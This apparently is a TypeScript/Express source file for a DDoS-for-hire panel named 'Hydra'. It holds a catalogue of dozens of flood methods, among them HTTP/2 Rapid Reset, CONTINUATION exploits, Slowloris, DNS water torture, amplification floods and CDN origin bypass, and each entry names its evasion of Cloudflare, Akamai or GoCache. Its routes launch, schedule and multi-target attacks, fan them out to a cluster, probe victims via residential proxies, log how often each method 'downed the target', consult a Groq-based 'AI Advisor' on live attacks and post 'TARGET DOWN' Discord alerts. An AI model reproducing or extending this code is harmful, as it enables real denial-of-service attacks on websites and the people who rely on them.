  { id: "dns-ns-flood",         name: "DNS NS Flood [Authoritative Killer]",   layer: "L3",   protocol: "DNS/UDP",              tier: "S",      description: "Resolve NS autoritativos do domínio e os destroi com A+MX+TXT+SOA queries aleatórias. 500-burst por socket, 3 pools por NS IP, 20% CHAOS class. Bypassa CDN/WAF totalmente." },
  { id: "bypass-storm",         name: "Bypass Storm ∞ (3-Phase Composite)",    layer: "L7",   protocol: "HTTP/2+TLS",           tier: "S",      description: "Phase 1: TLS Exhaust+ConnFlood → Phase 2: WAF Bypass+H2 RST+RapidReset → Phase 3: AppFlood+CacheBust. Fases independentes + RapidReset no Phase 2" },
  { id: "origin-bypass",        name: "CDN Origin Bypass [Dual-Front]",         layer: "ALL",  protocol: "HTTP+TLS+TCP",         tier: "S",      description: "Auto-descobre IP de origem via subdomain enum+IPv6+SPF+MX. Front 1 (70%): ataca origem diretamente (bypassa CDN). Front 2 (30%): cache-poison+waf-bypass esgota CDN edges. Cloudflare torna-se irrelevante." },
  // L7 Application
  { id: "waf-bypass",           name: "Hydra WAF Bypass",                     layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "JA3+AKAMAI Chrome fingerprint — evades Cloudflare/Akamai WAF with 7 concurrent vectors" },
  { id: "http2-flood",          name: "HTTP/2 Rapid Reset",                   layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "CVE-2023-44487 — 512-stream RST burst per session, millions req/s" },
  { id: "http2-continuation",   name: "H2 CONTINUATION (CVE-2024-27316)",     layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "CVE-2024-27316 — endless CONTINUATION frames, nginx/Apache OOM — NO patch for nginx ≤1.25.4" },
  { id: "hpack-bomb",           name: "HPACK Bomb (RFC 7541)",                layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "Incremental-indexed headers → HPACK table eviction storm" },
  { id: "h2-settings-storm",    name: "H2 Settings Storm",                    layer: "L7",   protocol: "HTTP/2",               tier: "A",      description: "SETTINGS oscillation + WINDOW_UPDATE flood — 3-layer H2 CPU+memory drain" },
  { id: "http-pipeline",        name: "HTTP Pipeline Flood",                  layer: "L7",   protocol: "HTTP/1.1",             tier: "A",      description: "HTTP/1.1 keep-alive pipelining — 512 reqs per TCP write, no wait, 300K+ req/s" },
  { id: "ws-flood",             name: "WebSocket Exhaustion",                 layer: "L7",   protocol: "WebSocket",            tier: "A",      description: "Holds thousands of WS conns open — goroutine/thread per conn" },
  { id: "cache-poison",         name: "CDN Cache Poisoning DoS",              layer: "L7",   protocol: "HTTP",                 tier: "A",      description: "Fills CDN cache with unique keys — 100% origin miss rate eviction" },
  { id: "slowloris",            name: "Slowloris",                            layer: "L7",   protocol: "HTTP/1.1",             tier: "A",      description: "25K half-open connections — starves nginx/apache thread pool" },
  { id: "conn-flood",           name: "TLS Connection Flood",                 layer: "L7",   protocol: "TLS",                  tier: "A",      description: "Opens & holds thousands of TLS sockets — pre-HTTP exhaustion" },
  { id: "tls-renego",           name: "TLS Renegotiation DoS",                layer: "TLS",  protocol: "TLS",                  tier: "A",      description: "Forces TLS 1.2 renegotiation — expensive public-key CPU per conn" },
  { id: "rudy-v2",              name: "RUDY v2 — Multipart SlowPOST",         layer: "L7",   protocol: "HTTP/1.1",             tier: "A",      description: "multipart/form-data + 70-char boundary — holds server threads, harder to detect" },
  { id: "http-flood",           name: "HTTP Flood",                           layer: "L7",   protocol: "HTTP",                 tier: "B",      description: "High-volume HTTP GET — overwhelms web server resources directly" },
  { id: "http-bypass",          name: "HTTP Bypass",                          layer: "L7",   protocol: "HTTP",                 tier: "A",      description: "Chrome-fingerprinted 3-layer: fetch+Chrome headers+slow drain — defeats WAF/CDN" },
  // L4 Transport
  { id: "quic-flood",           name: "QUIC/HTTP3 Flood (RFC 9000)",          layer: "L4",   protocol: "QUIC/UDP",             tier: "A",      description: "QUIC Initial packets — server allocates crypto state per DCID → OOM" },
  { id: "ssl-death",            name: "SSL Death Record",                     layer: "TLS",  protocol: "TLS",                  tier: "A",      description: "1-byte TLS records — 40K AES-GCM decrypts/sec on server CPU" },
  { id: "udp-flood",            name: "UDP Flood",                            layer: "L4",   protocol: "UDP",                  tier: "B",      description: "Raw UDP packet flood — saturates L4 bandwidth" },
  { id: "syn-flood",            name: "SYN Flood",                            layer: "L4",   protocol: "TCP",                  tier: "B",      description: "TCP SYN_RECV exhaustion — fills connection table pre-handshake" },
  { id: "tcp-flood",            name: "TCP Flood",                            layer: "L4",   protocol: "TCP",                  tier: "B",      description: "Raw TCP packet flood against open ports" },
  // L3 Network
  { id: "icmp-flood",           name: "ICMP Flood [3-tier engine]",           layer: "L3",   protocol: "ICMP",                 tier: "B",      description: "Real ICMP: raw-socket (CAP_NET_RAW), hping3, UDP saturation burst" },
  { id: "ntp-amp",              name: "NTP Flood [mode7+mode3]",              layer: "L3",   protocol: "NTP/UDP",              tier: "B",      description: "Real NTP binary protocol — mode7 monlist (CVE-2013-5211) + mode3 to port 123" },
  { id: "dns-amp",              name: "DNS Water Torture [CDN-bypass]",       layer: "L3",   protocol: "DNS",                  tier: "A",      description: "Floods NS servers with random subdomains — bypasses Cloudflare/CDN entirely" },
  { id: "mem-amp",              name: "Memcached UDP Flood [binary]",         layer: "L3",   protocol: "Memcached/UDP",        tier: "B",      description: "Real Memcached binary protocol UDP — get+stats to port 11211" },
  { id: "ssdp-amp",             name: "SSDP M-SEARCH Flood [UPnP]",          layer: "L3",   protocol: "SSDP/UDP",             tier: "B",      description: "Real SSDP protocol to port 1900 — rotates ST targets, UPnP stack exhaustion" },
  // ARES OMNIVECT ∞
  { id: "slow-read",            name: "Slow Read — TCP Buffer Exhaust",       layer: "L7",   protocol: "TCP",                  tier: "A",      description: "Pauses TCP recv window — server send buffer fills, all threads block on write" },
  { id: "range-flood",          name: "Range Flood — 500× I/O",              layer: "L7",   protocol: "HTTP",                 tier: "A",      description: "500 byte-range sub-requests per req — server disk/IO seek queue exhausted" },
  { id: "xml-bomb",             name: "XML Bomb — Billion Laughs XXE",        layer: "L7",   protocol: "HTTP/XML",             tier: "A",      description: "Nested XML entity expansion — parser OOM crash on any SOAP/XMLRPC endpoint" },
  { id: "h2-ping-storm",        name: "H2 PING Storm — RFC 7540 §6.7",        layer: "L7",   protocol: "HTTP/2",               tier: "A",      description: "300 PING frames/burst × 2ms per conn — server must ACK every one; CPU exhaustion" },
  { id: "http-smuggling",       name: "HTTP Request Smuggling — TE/CL Desync",layer: "L7",   protocol: "HTTP/1.1",             tier: "S",      description: "Transfer-Encoding/Content-Length desync — poisons backend request queue permanently" },
  { id: "doh-flood",            name: "DoH Flood — DNS-over-HTTPS Exhaust",   layer: "L7",   protocol: "HTTPS/DNS",            tier: "A",      description: "Wire-format DNS queries via HTTPS — exhausts recursive resolver thread pool" },
  { id: "keepalive-exhaust",    name: "Keepalive Exhaust — 256-Req Pipeline", layer: "L7",   protocol: "HTTP/1.1",             tier: "A",      description: "256-request pipeline per conn held 10-20s — MaxKeepAliveRequests saturation" },
  { id: "app-smart-flood",      name: "App Smart Flood — DB Query Exhaust",   layer: "L7",   protocol: "HTTP",                 tier: "A",      description: "POST to /login /search /checkout — forces DB queries, uncacheable" },
  { id: "large-header-bomb",    name: "Large Header Bomb — 32KB Headers",     layer: "L7",   protocol: "HTTP/1.1",             tier: "A",      description: "32KB randomized headers exhaust HTTP parser allocator, fills nginx header buffer" },
  { id: "http2-priority-storm", name: "H2 Priority Storm — RFC 7540 §6.3",    layer: "L7",   protocol: "HTTP/2",               tier: "A",      description: "PRIORITY frames force server to rebuild stream dependency tree — 150K frames/sec" },
  { id: "h2-rst-burst",         name: "H2 RST Burst — CVE-2023-44487",        layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "HEADERS+RST_STREAM pairs — pure write-path overload, zero read-side pressure" },
  { id: "grpc-flood",           name: "gRPC Flood — Handler Pool Exhaust",    layer: "L7",   protocol: "gRPC/HTTP2",           tier: "A",      description: "application/grpc content-type — exhausts gRPC handler thread pool" },
  // ── New vectors ───────────────────────────────────────────────────────────
  { id: "tls-session-exhaust",  name: "TLS Session Cache Exhaustion",          layer: "L4",   protocol: "TLS",                  tier: "A",      description: "Full TLS handshake per conn — no resumption — saturates server's RSA/ECDHE crypto thread pool. 5× more CPU-intensive than conn-flood" },
  { id: "cache-buster",         name: "Cache Busting — 100% Origin Hit Rate",  layer: "L7",   protocol: "HTTP",                 tier: "A",      description: "Unique cache keys + Cache-Control:no-cache + Vary bombs — forces CDN to miss 100% of requests, overwhelming the origin directly" },
  { id: "cdn-purge-flood",     name: "CDN Purge Flood — Cache Invalidation",  layer: "L7",   protocol: "HTTP/HTTPS",           tier: "S",      description: "Floods CDN purge endpoints (GoCache /cdn-cgi/purge, /cdn-cgi/cache-purge, PURGE/BAN methods) via proxies — forces cache miss on every subsequent request, routing all traffic to origin. GoCache-specific + generic." },
  { id: "cdn-slow-exhaust",    name: "CDN Pool Exhaust — Slow POST Origin",   layer: "L7",   protocol: "HTTP/HTTPS",           tier: "S",      description: "Esgota o pool de conexões CDN→origin via slow POST. Envia headers COMPLETOS (GoCache repassa ao origin), depois trickle 1 byte/8-18s para 1GB Content-Length. Origin segura thread aguardando body. Com ~200 conexões simultâneas via proxies residenciais, GoCache retorna 502 a usuários reais." },
  // Previously missing from catalogue
  { id: "udp-bypass",           name: "UDP Bypass",                            layer: "L4",   protocol: "UDP",                  tier: "B",      description: "UDP flood with bypass techniques to evade basic rate limiting and DDoS mitigation" },
  { id: "tcp-ack",              name: "TCP ACK Flood",                         layer: "L4",   protocol: "TCP",                  tier: "B",      description: "Sends ACK packets without established connections, forcing the target to process each one" },
  { id: "tcp-rst",              name: "TCP RST Flood",                         layer: "L4",   protocol: "TCP",                  tier: "B",      description: "Sends RST packets to disrupt existing TCP connections on the target" },
  { id: "graphql-dos",          name: "GraphQL Introspection DoS",             layer: "L7",   protocol: "HTTP",                 tier: "A",      description: "Deep introspection fragment bombs — exponential type resolution; exhausts GraphQL executor thread pool" },
  { id: "rudy",                 name: "R.U.D.Y — True SlowPOST",              layer: "L7",   protocol: "HTTP/1.1",             tier: "A",      description: "Content-Length:1GB then 1-2 bytes every 5-15s — Apache/IIS hold thread forever; 25K conns = full pool exhaustion" },
  { id: "vercel-flood",         name: "Vercel Flood ∞ (Next.js 4-Vector)",     layer: "L7",   protocol: "HTTP",                 tier: "A",      description: "RSC Bypass + Image Optimizer DoS + Edge API Cold Start + ISR Route Flood — saturates Vercel lambda concurrency limit" },
  { id: "cldap-amp",            name: "CLDAP Flood [UDP/389 LDAP]",            layer: "L3",   protocol: "UDP",                  tier: "B",      description: "BER-encoded LDAP SearchRequest to UDP/389 — exhausts Windows AD/OpenLDAP worker thread pool; alternates rootDSE + supportedCapabilities" },
  // ── New 2026 vectors ──────────────────────────────────────────────────────────
  { id: "rapid-reset",          name: "Rapid Reset Ultra [CVE-2023-44487]",    layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "2000 streams/burst pre-built into single write() — the attack that downed Google+CF+Fastly at 398M rps. Chrome 136 AKAMAI fingerprint. 6 connections/slot." },
  { id: "ws-compression-bomb",  name: "WS Compression Bomb [RFC 7692]",        layer: "L7",   protocol: "WebSocket",            tier: "S",      description: "permessage-deflate 1820× amplification: 36-byte frame → 65535-byte server decompress alloc. no_context_takeover forces per-message inflate state alloc." },
  { id: "h2-goaway-loop",       name: "H2 GOAWAY Loop — Lifecycle Exhaustion", layer: "L7",   protocol: "HTTP/2",               tier: "A",      description: "GOAWAY immediately after H2 setup forces TLS teardown+reconnect cycles: ECDHE key exchange + goroutine alloc/dealloc + H2 state per cycle. 5000 cycles/s." },
  { id: "sse-exhaust",          name: "SSE Exhaust — Event Stream Hold",       layer: "L7",   protocol: "HTTP/1.1",             tier: "A",      description: "Opens 18K Server-Sent Events connections silently. Each holds 1 server goroutine+buffer+FD for 90-180s. Looks like legitimate streaming traffic." },
  { id: "h2-multiplex",        name: "H2 Multiplex — True Stream Pooling",    layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "True HTTP/2 multiplexing: N sessions x maxConcurrentStreams open simultaneously. Zero RST — each stream reads full response, then instantly replaced. 10x fewer TCP conns vs HTTP/1.1 for same load. Dev: 20 sessions x 32 streams = 640 concurrent. Prod: 150 x 128 = 19,200 concurrent. Bypasses per-IP conn limits. 60% GET + 40% POST with real bodies forces origin handler dispatch. Cache-busted URLs force 100% origin hit." },
];

// ── Routes ────────────────────────────────────────────────────────────────
router.get("/attacks", async (_req, res): Promise<void> => {
  const attacks = await db.select().from(attacksTable).orderBy(desc(attacksTable.createdAt));
  res.json(attacks);
});

router.post("/attacks", attackLimiter, async (req, res): Promise<void> => {
  const p = CreateAttackBody.safeParse(req.body);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const { target, port, method, duration, threads, webhookUrl } = p.data;

  // Show effective connection count after power-level multiplier
  // (threads × THREAD_MULTIPLIER, capped by prod/dev limits)
  const threadsEffective = Math.min(threads * THREAD_MULTIPLIER, IS_DEPLOYED ? 12000 : DEV_MAX_THREADS);

  const [attack] = await db.insert(attacksTable).values({
    target, port, method, duration, threads, threadsEffective,
    status: "running", packetsSent: 0, bytesSent: 0,
    webhookUrl: webhookUrl ?? null,
  }).returning();

  const id   = attack.id;
  const ctrl = new AbortController();
  const endTime = Date.now() + duration * 1000;
  const stopTimer = setTimeout(() => ctrl.abort("duration_expired"), duration * 1000);

  // Store for manual stop + extend support
  attackAborts.set(id, ctrl);
  attackTimers.set(id, stopTimer);
  attackEndTimes.set(id, endTime);

  // Init in-memory counters
  livePackets.set(id, 0);
  liveBytes.set(id, 0);
  livePps.set(id, 0);
  liveBps.set(id, 0);
  prevPktsSnap.set(id, 0);
  prevBytesSnap.set(id, 0);
  liveResponseCodes.set(id, { ok: 0, redir: 0, client: 0, server: 0, timeout: 0 });
  liveLatAvgMs.set(id, 0);

  // T003: Register code dispatcher in global registry (keyed by AbortSignal)
  _codeDispatchers.set(ctrl.signal, (codes, latAvgMs) => onWorkerCodes(id, codes, latAvgMs));
  ctrl.signal.addEventListener("abort", () => _codeDispatchers.delete(ctrl.signal), { once: true });

  // ── Live site probe loop — auto-probe every 15s via residential proxy ──────
  // Gives real impact measurement from a clean IP (bypasses WAF IP bans on our infra)
  {
    const _probeTargetUrl = /^https?:\/\//i.test(target) ? target : `https://${target}`;
    const _probeHist: ProbeResult[] = [];
    liveProbeHistory.set(id, _probeHist);
    // First probe immediately to establish baseline before attack hits
    void _attackProbe(_probeTargetUrl).then(pr => {
      _probeHist.push(pr);
      liveProbeResult.set(id, pr);
    }).catch(() => {});
    const _probeTimer = setInterval(async () => {
      if (!attackAborts.has(id)) { clearInterval(_probeTimer); return; }
      try {
        const pr = await _attackProbe(_probeTargetUrl);
        _probeHist.push(pr);
        if (_probeHist.length > 20) _probeHist.shift(); // keep last 20 readings
        liveProbeResult.set(id, pr);
      } catch { /* probe is best-effort */ }
    }, 15_000);
    ctrl.signal.addEventListener("abort", () => clearInterval(_probeTimer), { once: true });
  }

  // ── Hydra Override cluster fan-out (primary node only, not peer) ────────────
  if (method === "geass-override" && !req.query.peer) {
    fanOutToCluster(target, port, method, duration, threads);
  }

  void runAttackWorkers(method, target, port, threads, ctrl.signal,
    (pkts, bytes, conns) => onWorkerStats(id, pkts, bytes, conns),
    id, // T004: pass attack id so Hydra Override burst loop can read response codes
  ).finally(async () => {
    // Final flush of any pending batch stats
    const pending = dbBatchPkts.get(id) ?? 0;
    const pendingBytes = dbBatchBytes.get(id) ?? 0;
    dbBatchPkts.delete(id);
    dbBatchBytes.delete(id);
    if (pending > 0 || pendingBytes > 0) {
      addStats(id, pending, pendingBytes).catch(err =>
        console.warn(`[FINALLY] addStats flush failed for #${id}:`, err instanceof Error ? err.message : err)
      );
    }

    attackLiveConns.delete(id);
    livePackets.delete(id);
    liveBytes.delete(id);
    livePps.delete(id);
    liveBps.delete(id);
    prevPktsSnap.delete(id);
    prevBytesSnap.delete(id);
    // T003: keep codes for 60s so panel can show final breakdown, then cleanup
    setTimeout(() => { liveResponseCodes.delete(id); liveLatAvgMs.delete(id); }, 60_000);
    // Keep timeseries for 60s after attack ends so panel can render final chart
    setTimeout(() => liveTimeseries.delete(id), 60_000);
    // Keep probe history + origin IP for 60s after attack so panel can show final impact
    setTimeout(() => {
      liveProbeResult.delete(id);
      liveProbeHistory.delete(id);
      liveOriginIP.delete(id);
    }, 60_000);
    const t = attackTimers.get(id);
    if (t) clearTimeout(t);
    attackTimers.delete(id);
    attackAborts.delete(id);
    attackEndTimes.delete(id);
    try {
      const [cur] = await db.select().from(attacksTable).where(eq(attacksTable.id, id));
      if (cur?.status === "running") {
        // Persist final response code breakdown so panel/API keeps them after memory cleanup
        const finalCodes = liveResponseCodes.get(id) ?? { ok: 0, redir: 0, client: 0, server: 0, timeout: 0 };
        const [fin] = await db.update(attacksTable)
          .set({
            status: "finished", stoppedAt: new Date(),
            codesOk: finalCodes.ok,
            codesRedir: finalCodes.redir,
            codesClient: finalCodes.client,
            codesServer: finalCodes.server,
            codesTimeout: finalCodes.timeout,
          })
          .where(eq(attacksTable.id, id)).returning();
        if (fin?.webhookUrl) await fireWebhook(fin.webhookUrl, fin);
      }
    } catch (err) {
      console.warn(`[ATTACK #${id}] DB finalize failed:`, err instanceof Error ? err.message : err);
    }
  });

  res.status(201).json(attack);
});

// Map for abort controllers + stop timers (for Extend support)
export const attackAborts  = new Map<number, AbortController>();

// ── Exported getter for SSE events route ─────────────────────────────────
export function getActiveAttackCount(): number { return attackAborts.size; }
const attackTimers  = new Map<number, ReturnType<typeof setTimeout>>();

// ── Scheduled attacks (GET must be BEFORE /attacks/:id to avoid conflict) ──
router.get("/attacks/scheduled", (_req, res): void => {
  res.json([...scheduledAttacks.values()]);
});

router.get("/attacks/stats", async (_req, res): Promise<void> => {
  // Run all 4 queries in parallel — no full table scan in JS
  const [aggRows, methodRows, recentAttacks, efficacyRows] = await Promise.all([
    // 1. Aggregate totals — O(1) via SQL COUNT/SUM
    db.select({
      totalAttacks:     sql<number>`COUNT(*)::int`,
      runningAttacks:   sql<number>`COUNT(*) FILTER (WHERE status = 'running')::int`,
      totalPacketsSent: sql<number>`COALESCE(SUM(packets_sent), 0)::bigint`,
      totalBytesSent:   sql<number>`COALESCE(SUM(bytes_sent), 0)::bigint`,
    }).from(attacksTable),
    // 2. Per-method counts — O(distinct methods) index scan
    db.select({
      method: attacksTable.method,
      count:  sql<number>`COUNT(*)::int`,
    }).from(attacksTable).groupBy(attacksTable.method),
    // 3. Recent 10 only — O(10) with LIMIT
    db.select().from(attacksTable).orderBy(desc(attacksTable.createdAt)).limit(10),
    // 4. Per-method efficacy — how many times each method downed the target
    db.select({
      method:    attacksTable.method,
      total:     sql<number>`COUNT(*)::int`,
      downed:    sql<number>`COUNT(*) FILTER (WHERE target_went_down = true)::int`,
    }).from(attacksTable).where(sql`status != 'running'`).groupBy(attacksTable.method),
  ]);
  const agg = aggRows[0];
  const efficacyMap: Record<string, { total: number; downed: number; rate: number }> = {};
  for (const r of efficacyRows) {
    efficacyMap[r.method] = {
      total:  r.total,
      downed: r.downed,
      rate:   r.total > 0 ? Math.round((r.downed / r.total) * 100) : 0,
    };
  }
  res.json({
    totalAttacks:     agg.totalAttacks,
    runningAttacks:   agg.runningAttacks,
    totalPacketsSent: Number(agg.totalPacketsSent),
    totalBytesSent:   Number(agg.totalBytesSent),
    attacksByMethod:  methodRows,
    efficacy:         efficacyMap,
    recentAttacks,
    cpuCount:         CPU_COUNT,
  });
});

// Live timeseries — last 60 samples (1 per second) for chart rendering
router.get("/attacks/:id/timeseries", (req, res): void => {
  const id = parseInt(req.params.id, 10);
  if (isNaN(id)) { res.status(400).json({ error: "Invalid id" }); return; }
  const series = liveTimeseries.get(id) ?? [];
  res.json({ samples: series, max: TIMESERIES_MAX });
});

// Live in-memory stats — real-time, no DB latency
// Returns conns, pps, bps, totalPackets, totalBytes, running
router.get("/attacks/:id/live", (req, res): void => {
  const id = parseInt(req.params.id, 10);
  if (isNaN(id)) { res.status(400).json({ error: "Invalid id" }); return; }
  const running = attackAborts.has(id);
  const codes = liveResponseCodes.get(id) ?? { ok: 0, redir: 0, client: 0, server: 0, timeout: 0 };
  res.json({
    conns:        attackLiveConns.get(id) ?? 0,
    running,
    pps:          livePps.get(id)     ?? 0,
    bps:          liveBps.get(id)     ?? 0,
    totalPackets: livePackets.get(id) ?? 0,
    totalBytes:   liveBytes.get(id)   ?? 0,
    // T003 — response code breakdown + average latency
    codes,
    latAvgMs:     liveLatAvgMs.get(id) ?? 0,
    // Real-impact probe — site status via residential proxy (not blocked by WAF)
    probe:        liveProbeResult.get(id)  ?? null,
    probeHistory: liveProbeHistory.get(id) ?? [],
    originIP:     liveOriginIP.get(id)     ?? null,
  });
});

router.get("/attacks/:id", async (req, res): Promise<void> => {
  const p = GetAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const [a] = await db.select().from(attacksTable).where(eq(attacksTable.id, p.data.id));
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  res.json(a);
});

router.delete("/attacks/:id", async (req, res): Promise<void> => {
  const p = DeleteAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const [a] = await db.delete(attacksTable).where(eq(attacksTable.id, p.data.id)).returning();
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  res.sendStatus(204);
});

// ── Extend running attack by +60s ────────────────────────────────────────
router.patch("/attacks/:id/extend", async (req, res): Promise<void> => {
  const id = parseInt(req.params.id, 10);
  if (isNaN(id)) { res.status(400).json({ error: "Invalid id" }); return; }
  const ctrl = attackAborts.get(id);
  if (!ctrl) { res.status(404).json({ error: "Attack not running" }); return; }
  const addSec = typeof req.body?.seconds === "number" ? Math.min(req.body.seconds, 3600) : 60;

  // Clear old stop timer, arm new one using correct remaining time
  // Bug-fix: previously reset timer to addSec from NOW, losing remaining original time.
  // Now we compute: newEndTime = max(now, currentEndTime) + addSec
  const old = attackTimers.get(id);
  if (old) clearTimeout(old);
  const currentEnd = attackEndTimes.get(id) ?? Date.now();
  const newEnd     = Math.max(Date.now(), currentEnd) + addSec * 1000;
  const msFromNow  = newEnd - Date.now();
  attackEndTimes.set(id, newEnd);
  const newTimer = setTimeout(() => ctrl.abort("duration_expired"), msFromNow);
  attackTimers.set(id, newTimer);

  const [a] = await db.update(attacksTable)
    .set({ duration: sql`${attacksTable.duration} + ${addSec}` })
    .where(eq(attacksTable.id, id)).returning();
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  res.json({ ok: true, extended: addSec, ...a });
});

router.post("/attacks/:id/stop", async (req, res): Promise<void> => {
  const p = StopAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const ctrl = attackAborts.get(p.data.id);
  if (ctrl) { ctrl.abort("manual_stop"); attackAborts.delete(p.data.id); }
  const [a] = await db.update(attacksTable)
    .set({ status: "stopped", stoppedAt: new Date() })
    .where(eq(attacksTable.id, p.data.id)).returning();
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  if (a.webhookUrl) await fireWebhook(a.webhookUrl, a, "attack_stopped");
  res.json({ ok: true, ...a });
});

// ── Mark target as down (called by bot monitor when confirmed down) ──────────
router.post("/attacks/:id/down", async (req, res): Promise<void> => {
  const id = parseInt(req.params.id, 10);
  if (isNaN(id)) { res.status(400).json({ error: "Invalid id" }); return; }
  await db.update(attacksTable).set({ targetWentDown: true }).where(eq(attacksTable.id, id));
  res.json({ ok: true });
});

// ── AI Advisor — Groq-powered live attack analysis ─────────────────────────
router.get("/attacks/:id/ai-advisor", async (req, res): Promise<void> => {
  const id = parseInt(req.params.id, 10);
  if (isNaN(id)) { res.status(400).json({ error: "Invalid id" }); return; }
  const [attack] = await db.select().from(attacksTable).where(eq(attacksTable.id, id));
  if (!attack) { res.status(404).json({ error: "Not found" }); return; }
  const pps   = livePps.get(id)     ?? 0;
  const bps   = liveBps.get(id)     ?? 0;
  const conns = attackLiveConns.get(id) ?? 0;
  // Quick target probe
  let targetStatus = "unknown"; let targetLatencyMs = 0;
  try {
    const t0 = Date.now();
    const pr = await fetch(`https://${attack.target}/`, { signal: AbortSignal.timeout(5000), headers: { "User-Agent": "Mozilla/5.0" } });
    targetLatencyMs = Date.now() - t0; targetStatus = String(pr.status);
  } catch { targetStatus = "offline"; }
  try {
    const advice = await groqAdvisor(attack, pps, bps, conns, targetStatus, targetLatencyMs);
    res.json({ ...advice, metrics: { pps, bps, conns, targetStatus, targetLatencyMs, running: attackAborts.has(id) } });
  } catch (e) { res.status(503).json({ error: "AI advisor unavailable", detail: String(e) }); }
});

// ── Scheduled attacks ──────────────────────────────────────────────────────
router.post("/attacks/schedule", (req, res): void => {
  const { target, port, method, duration, threads, scheduledFor, webhookUrl } = req.body as Record<string, unknown>;
  if (!target || !port || !method || !duration || !threads || !scheduledFor) {
    res.status(400).json({ error: "Missing: target, port, method, duration, threads, scheduledFor" }); return;
  }
  const fireAt = new Date(scheduledFor as string).getTime();
  if (isNaN(fireAt) || fireAt <= Date.now()) {
    res.status(400).json({ error: "scheduledFor must be a future ISO timestamp" }); return;
  }
  const sid = `sched_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
  const sa: ScheduledAttack = {
    id: sid, target: String(target), port: Number(port),
    method: String(method), duration: Number(duration), threads: Number(threads),
    webhookUrl: webhookUrl ? String(webhookUrl) : undefined,
    scheduledFor: fireAt, createdAt: Date.now(),
  };
  scheduledAttacks.set(sid, sa);
  res.status(201).json(sa);
});

router.delete("/attacks/scheduled/:sid", (req, res): void => {
  const { sid } = req.params;
  if (!scheduledAttacks.has(sid)) { res.status(404).json({ error: "Scheduled attack not found" }); return; }
  scheduledAttacks.delete(sid);
  res.json({ ok: true, deleted: sid });
});

// ── Multi-target simultaneous attack ──────────────────────────────────────
router.post("/attacks/multi", async (req, res): Promise<void> => {
  const { targets, port, method, duration, threads, webhookUrl } = req.body as {
    targets: string[]; port?: number; method?: string; duration?: number; threads?: number; webhookUrl?: string;
  };
  if (!Array.isArray(targets) || targets.length === 0) {
    res.status(400).json({ error: "targets must be a non-empty array" }); return;
  }
  if (targets.length > 5) { res.status(400).json({ error: "Maximum 5 simultaneous targets" }); return; }
  const results: (typeof attacksTable.$inferSelect)[] = [];
  for (const tgt of targets) {
    const [atk] = await db.insert(attacksTable).values({
      target: tgt, port: port ?? 443, method: method ?? "geass-override",
      duration: duration ?? 60, threads: threads ?? 1000,
      status: "running", packetsSent: 0, bytesSent: 0,
      webhookUrl: webhookUrl ?? null,
    }).returning();
    const aid = atk.id;
    const ctrl = new AbortController();
    const endMs = Date.now() + (duration ?? 60) * 1000;
    attackAborts.set(aid, ctrl);
    attackTimers.set(aid, setTimeout(() => ctrl.abort("duration_expired"), (duration ?? 60) * 1000));
    attackEndTimes.set(aid, endMs);
    livePackets.set(aid, 0); liveBytes.set(aid, 0);
    livePps.set(aid, 0);     liveBps.set(aid, 0);
    prevPktsSnap.set(aid, 0); prevBytesSnap.set(aid, 0);
    if ((method ?? "geass-override") === "geass-override") fanOutToCluster(tgt, port ?? 443, "geass-override", duration ?? 60, threads ?? 1000);
    void runAttackWorkers(method ?? "geass-override", tgt, port ?? 443, threads ?? 1000, ctrl.signal,
      (pkts, bytes, conns) => onWorkerStats(aid, pkts, bytes, conns)
    ).finally(async () => {
      const pp = dbBatchPkts.get(aid) ?? 0; const bb = dbBatchBytes.get(aid) ?? 0;
      dbBatchPkts.delete(aid); dbBatchBytes.delete(aid);
      if (pp > 0 || bb > 0) {
        addStats(aid, pp, bb).catch(err =>
          console.warn(`[SCHED-FINALLY] addStats flush failed for #${aid}:`, err instanceof Error ? err.message : err)
        );
      }
      attackLiveConns.delete(aid); livePackets.delete(aid); liveBytes.delete(aid);
      livePps.delete(aid);         liveBps.delete(aid);
      prevPktsSnap.delete(aid);    prevBytesSnap.delete(aid);
      const t = attackTimers.get(aid); if (t) clearTimeout(t);
      attackTimers.delete(aid); attackAborts.delete(aid); attackEndTimes.delete(aid);
      setTimeout(() => liveTimeseries.delete(aid), 60_000);
      try {
        const [cur] = await db.select().from(attacksTable).where(eq(attacksTable.id, aid));
        if (cur?.status === "running") {
          const [fin] = await db.update(attacksTable).set({ status: "finished", stoppedAt: new Date() })
            .where(eq(attacksTable.id, aid)).returning();
          if (fin?.webhookUrl) await fireWebhook(fin.webhookUrl, fin);
        }
      } catch (err) {
        console.warn(`[SCHED-ATTACK #${aid}] DB finalize failed:`, err instanceof Error ? err.message : err);
      }
    });
    results.push(atk);
  }
  res.status(201).json({ attacks: results, count: results.length });
});

// ── Kill Webhook notify — fire Discord/custom webhook with attack kill confirmation ──
router.post("/notify", async (req, res): Promise<void> => {
  const { webhookUrl, attackId, event, message } = req.body as Record<string, string>;
  if (!webhookUrl) { res.status(400).json({ error: "webhookUrl is required" }); return; }
  let attackData: typeof attacksTable.$inferSelect | null = null;
  if (attackId) {
    try {
      const [a] = await db.select().from(attacksTable).where(eq(attacksTable.id, parseInt(attackId, 10)));
      attackData = a ?? null;
    } catch (err) {
      console.warn("[NOTIFY] DB fetch failed:", err instanceof Error ? err.message : err);
    }
  }
  const evt = event ?? "target_down";
  const desc = message ?? (attackData ? `Target **${attackData.target}** confirmed OFFLINE` : "Target confirmed OFFLINE");
  const payload = {
    username: "Hydra",
    avatar_url: "https://i.imgur.com/ZHKmhI7.png",
    embeds: [{
      title: evt === "target_down" ? "🔴 TARGET DOWN — CONFIRMED" : "⚔️ HYDRA — ATTACK EVENT",
      description: desc,
      color: evt === "target_down" ? 0xFF0000 : 0xFF6600,
      fields: (() => {
